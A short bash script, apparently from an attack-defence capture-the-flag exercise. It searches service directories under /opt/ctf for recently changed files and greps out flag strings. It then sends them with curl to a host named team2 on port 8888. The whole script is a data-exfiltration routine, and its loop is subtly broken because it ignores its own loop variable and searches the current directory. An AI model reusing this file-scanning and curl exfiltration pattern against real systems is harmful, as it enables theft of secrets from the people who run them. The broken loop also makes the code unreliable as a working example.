#!/bin/bash

HOST="team2"
PORT="8888"

for SVC in `find /opt/ctf/ -name rw -type d`;
do
    FLAGS=`find . -type f -cmin -3 -exec grep -o '^FLG[[:alnum:]]\{13\}' {} \; | paste -sd '/'`
    curl  "$HOST:$PORT/$FLAGS"
done

